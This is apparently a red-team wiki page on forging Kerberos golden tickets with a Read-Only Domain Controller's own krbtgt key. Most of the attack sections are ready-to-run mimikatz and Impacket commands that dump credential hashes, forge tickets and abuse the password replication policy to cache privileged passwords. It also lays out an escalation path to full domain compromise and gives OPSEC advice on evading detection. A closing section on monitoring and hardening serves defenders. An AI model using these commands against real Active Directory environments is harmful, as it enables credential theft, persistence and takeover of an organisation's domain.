---
title: RODC golden tickets
slug: rodc-golden-tickets
aliases: [RODC krbtgt, read-only domain controller golden ticket, RODC password replication]
---

> **TL;DR:** Read-Only Domain Controllers have their own `krbtgt_XXXXX` key. Forging a golden ticket with it works only for accounts in the RODC's `msDS-RevealedList` (those whose credentials the RODC is allowed to cache). Abuse the password replication policy or the revealed list to forge targeted tickets that may evade detection geared toward the main `krbtgt`.

## RODC architecture recap

An RODC is a Domain Controller that:
- Holds a **read-only** copy of the AD database
- Has its own `krbtgt` account: `krbtgt_XXXXX` (where XXXXX is the RODC's number)
- Caches only a subset of user passwords based on the **Password Replication Policy (PRP)**
- Cannot write changes back to AD (no outbound replication of changes)
- Is deployed in branch offices, DMZs, or low-security locations

```
Main DC (writable)          RODC (branch)
  krbtgt (main)         ←→   krbtgt_12345 (RODC-specific)
  All credentials              Cached subset only
```

## RODC krbtgt and ticket signing

When the RODC issues a TGT, it signs it with `krbtgt_XXXXX`, not the main `krbtgt`. A writable DC receiving this TGT:
1. Identifies it was signed by an RODC (kvno encodes the RODC number)
2. Validates it using the RODC's `krbtgt_XXXXX` key (which the writable DC also knows)
3. Checks if the user is in the RODC's allowed replication set
4. If valid, re-issues a TGT signed with the real `krbtgt`

## Obtaining the RODC krbtgt hash

```powershell
# Method 1: DCSync the RODC's krbtgt account (requires replication rights)
mimikatz # lsadump::dcsync /user:krbtgt_12345 /domain:corp.local

# Method 2: Compromise the RODC itself (local admin / SYSTEM)
mimikatz # lsadump::lsa /patch
# Look for krbtgt_XXXXX in the output

# Method 3: secretsdump against the RODC
impacket-secretsdump corp.local/admin@rodc01 -just-dc-user krbtgt_12345

# Find the RODC krbtgt account name
Get-ADUser -Filter {name -like "krbtgt_*"} -Properties msDS-KrbTgtLinkBl |
    Select-Object Name, DistinguishedName
```

## Which accounts can be forged

The RODC can only cache (and therefore its `krbtgt` only signs tickets for) accounts allowed by the **Password Replication Policy**:

```powershell
# Query the PRP — Allowed List
Get-ADDomainController -Filter {IsReadOnly -eq $true} |
    ForEach-Object {
        Get-ADObject $_.ComputerObjectDN -Properties msDS-RevealOnDemandGroup
    }

# Query the PRP — Denied List (overrides allowed)
Get-ADObject $rodcDN -Properties msDS-NeverRevealGroup

# Accounts whose passwords have ACTUALLY been cached (revealed)
Get-ADObject $rodcDN -Properties "msDS-RevealedList" |
    Select-Object -ExpandProperty "msDS-RevealedList"

# Or use repadmin
repadmin /prp view RODC01 reveal
repadmin /prp view RODC01 allow
repadmin /prp view RODC01 deny
```

**Default PRP:**
- **Allowed:** `Allowed RODC Password Replication Group` (empty by default)
- **Denied:** `Denied RODC Password Replication Group` (includes Domain Admins, Enterprise Admins, krbtgt, etc.)

## Forging RODC golden tickets

```
# Forge TGT with RODC krbtgt key
mimikatz # kerberos::golden /user:targetuser /domain:corp.local \
    /sid:S-1-5-21-... /krbtgt:RODC_KRBTGT_HASH \
    /rodc:12345 /id:1103 /groups:513 /ptt

# /rodc:XXXXX — the RODC number (from krbtgt_XXXXX account name)
# /user — must be an account in the msDS-RevealedList
# /id — the user's actual RID
```

With Impacket:

```bash
# ticketer.py supports RODC tickets
impacket-ticketer -nthash RODC_KRBTGT_HASH \
    -domain-sid S-1-5-21-... \
    -domain corp.local \
    -extra-sid S-1-5-21-...-513 \
    targetuser
# NOTE: specify the RODC kvno if required
```

**Key constraint:** The forged ticket only works for accounts whose credentials the RODC has cached. The writable DC verifies the user is in `msDS-RevealedList` — forging a ticket for a Domain Admin who was never cached on the RODC will be rejected.

## Password Replication Policy abuse

If you have write access to the RODC's computer object or the PRP groups:

```powershell
# Add a high-value target to the Allowed Replication Group
Add-ADGroupMember -Identity "Allowed RODC Password Replication Group" `
    -Members "HighValueUser"

# Force password caching by triggering authentication through the RODC
# (e.g., map a drive via the RODC's IP)
net use \\RODC01\C$ /user:corp\HighValueUser password

# Now the account is in msDS-RevealedList and can be forged
```

**Escalation path:** RODC computer account compromise -> modify PRP -> cache DA password -> forge RODC golden ticket -> writable DC accepts it -> domain compromise.

## Detection and defence

### Monitoring

```powershell
# Event ID 4769 — TGS requests with RODC kvno
# The kvno in a TGT identifies which krbtgt signed it
# RODC-signed tickets re-presented to writable DCs are normal, but volume spikes are not

# Event ID 4662 — monitor changes to PRP attributes
# msDS-RevealOnDemandGroup and msDS-NeverRevealGroup modifications

# Event ID 4767 / 4781 — changes to Allowed/Denied RODC Replication Groups
```

### Hardening

- **Minimise the Allowed list** — only accounts that MUST authenticate through the RODC
- **Never add privileged accounts** to the Allowed RODC Replication Group
- **Ensure the Denied list includes** all Tier 0 accounts (Domain Admins, Enterprise Admins, krbtgt, DC computer accounts)
- **Rotate RODC krbtgt** independently — `Reset-ADServiceAccountPassword krbtgt_XXXXX` or use the KDC key rotation mechanism
- **Monitor `msDS-RevealedList`** growth — unexpected accounts appearing means passwords were cached
- **Physical security** — RODCs in branch offices can be physically stolen; BitLocker + TPM is mandatory

### RODC vs main golden ticket comparison

| Aspect | Main `krbtgt` golden ticket | RODC golden ticket |
|---|---|---|
| Key source | Main `krbtgt` hash | `krbtgt_XXXXX` hash |
| Scope | Any account in the domain | Only `msDS-RevealedList` accounts |
| Detection | kvno matches main krbtgt | kvno encodes RODC number |
| Stealth | Well-known detection rules | Less commonly monitored |
| Persistence | Survives until krbtgt rotated (2x) | Survives until RODC krbtgt rotated |

## OPSEC pitfalls

- Forging tickets for accounts NOT in `msDS-RevealedList` fails and may generate error events on the writable DC
- Modifying the PRP (adding accounts to the Allowed group) is a visible AD change
- RODC compromise is often easier physically (branch office) but the limited credential set reduces value
- Some organisations don't rotate RODC `krbtgt` keys separately — the RODC golden ticket may persist longer than expected
- MDI detects anomalous RODC-signed tickets presented to writable DCs

## References

- [Microsoft — RODC technical reference](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-read-only-domain-controllers)
- [Microsoft — RODC password replication policy](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/rodc/read-only-domain-controller-password-replication-policy)
- [Dirk-jan Mollema — RODC research](https://dirkjanm.io/)
- [Charlie Bromberg (Shutdown) — Hacker Recipes RODC](https://www.thehacker.recipes/)
- [MITRE ATT&CK — T1558.001 Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)

See also: [[golden-tickets]], [[diamond-and-sapphire-tickets]], [[kerberos]], [[dcsync]], [[silver-tickets]], [[cross-forest-trust-abuse]], [[ad-persistence]]
